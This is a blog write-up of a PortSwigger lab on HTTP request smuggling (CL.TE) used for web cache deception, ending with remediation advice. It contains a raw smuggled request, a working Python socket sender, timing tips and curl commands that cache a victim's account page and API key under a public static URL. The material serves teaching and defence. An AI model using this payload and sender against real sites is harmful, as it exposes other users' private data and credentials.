---
layout: post
title: "PortSwigger: Exploiting HTTP Request Smuggling to Perform Web Cache Deception"
date: 2027-09-19 09:00:00 -0500
categories: [PortSwigger, WebSecurityAcademy, RequestSmuggling]
tags: [portswigger, http-request-smuggling, web-cache-deception, cl-te, desync, cache, transfer-encoding, cwe-444, cwe-525]
---

Most request-smuggling labs end with you bypassing an access-control rule or stealing a session. This one is different: we use a CL.TE desync to make the **cache** store another user's private page under a public URL, then read it back anonymously. That's **web cache deception** — and smuggling supplies the one missing ingredient: control over *which* of the victim's requests gets turned into a request for their own account page.

## Overview

- **Vuln class:** HTTP request smuggling (CL.TE) → web cache deception
- **CWE:** [CWE-444 — Inconsistent Interpretation of HTTP Requests](https://cwe.mitre.org/data/definitions/444.html) + [CWE-525 — Use of Web Browser Cache Containing Sensitive Information](https://cwe.mitre.org/data/definitions/525.html)
- **Goal:** smuggle a request so the next user's request causes their API key to be cached, then retrieve it.

## Poisoning vs deception

It helps to keep the two cache attacks straight:

- **Cache poisoning** — you make the cache store *malicious* content that is then served to other users.
- **Cache deception** — you make the cache store *another user's sensitive* content under a URL *you* can request, then you read it.

This lab is deception. The sensitive content is the victim's `/my-account` page, which prints `Your API Key is: ...`.

## Step 1 — Recon

Logging in as `wiener:peter`, `GET /my-account` returns:

```
<div>Your API Key is: CL2JoF5Zs9QkbeMCe40KLQ7IyIHDId9m</div>
```

The interesting detail is the static assets. Each file under `/resources/` comes back cacheable:

```
$ curl -sk -D - https://LAB/resources/labheader/js/labHeader.js -o /dev/null | grep -i cache
cache-control: public, max-age=3600
x-cache: miss
```

`public` + an `x-cache` header means the front-end caches these by URL. That's our drop point.

## Step 2 — The CL.TE desync

The front-end honors `Content-Length`; the back-end honors `Transfer-Encoding: chunked`. We send this raw over a TLS socket (curl can't — it refuses to send conflicting CL and TE):

```
POST / HTTP/1.1
Host: LAB.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 42
Transfer-Encoding: chunked

0

GET /my-account HTTP/1.1
X-Ignore: X
```

- The body is `0\r\n\r\nGET /my-account HTTP/1.1\r\nX-Ignore: X` — exactly **42 bytes**, so `Content-Length: 42`.
- The front-end reads all 42 bytes as one request and forwards it.
- The back-end sees the chunked `0\r\n\r\n` terminator and **stops there**, leaving `GET /my-account HTTP/1.1\r\nX-Ignore: X` buffered on the connection.

A minimal Python sender (note the forced `http/1.1` ALPN — without it the TLS handshake negotiates HTTP/2, which has no CL/TE ambiguity and the desync silently fails):

```python
import socket, ssl
HOST = "LAB.web-security-academy.net"
body = "0\r\n\r\nGET /my-account HTTP/1.1\r\nX-Ignore: X"
req = (f"POST / HTTP/1.1\r\nHost: {HOST}\r\n"
       f"Content-Type: application/x-www-form-urlencoded\r\n"
       f"Content-Length: {len(body)}\r\nTransfer-Encoding: chunked\r\n\r\n{body}")
ctx = ssl.create_default_context(); ctx.set_alpn_protocols(["http/1.1"])
s = ctx.wrap_socket(socket.create_connection((HOST, 443)), server_hostname=HOST)
s.sendall(req.encode()); s.recv(4096); s.close()
```

## Step 3 — Let the victim cache themselves

The victim bot browses periodically (it fires after POST requests). When it requests a cacheable static file — say `GET /resources/js/tracking.js` — that request reuses the poisoned back-end connection and is appended after `X-Ignore: X`. So the back-end actually processes:

```
GET /my-account HTTP/1.1
X-Ignore: XGET /resources/js/tracking.js HTTP/1.1
Host: ...
Cookie: session=<VICTIM>
```

It serves `/my-account` **with the victim's cookie** → their API key. The front-end maps that response to the URL the victim *asked* for (`/resources/js/tracking.js`) and caches the private page under that public static URL.

So: send the smuggle in bursts, then poll every `/resources/*` path for the key. Don't poll between sends on the same socket — a poll request would consume the poison itself.

```
round 1: FOUND /resources/js/tracking.js -> Your API Key is: aQvOHuSRESmZjJ8vbe7Tve7kyKedqCX5
```

## Step 4 — Read and submit

```bash
$ curl -sk https://LAB/resources/js/tracking.js | grep -o 'Your API Key is: [A-Za-z0-9]*'
Your API Key is: aQvOHuSRESmZjJ8vbe7Tve7kyKedqCX5

$ curl -sk https://LAB/submitSolution --data-urlencode "answer=aQvOHuSRESmZjJ8vbe7Tve7kyKedqCX5"
{"correct":true}
```

The lab flips to **Solved**.

## Gotchas

- **Read the static resource, not `/`.** The home page is frequently *not* cached, so polling `/` returns nothing. Enumerate the page's `/resources/*` links and poll them all.
- **Burst, don't poll mid-burst.** Each poll on the connection consumes the poison; the victim has to land on a still-poisoned socket.
- **Force HTTP/1.1.** Over HTTPS, default ALPN gives you HTTP/2 and the desync never happens.

## The fix

- **Smuggling (CWE-444):** use one normalized HTTP parser front-to-back; reject any request carrying both `Content-Length` and `Transfer-Encoding`; ideally speak HTTP/2 end-to-end.
- **Cache (CWE-525):** never serve a static-path cache entry whose body came from a dynamic or authenticated handler. Don't cache responses that carry `Set-Cookie` or per-user content.
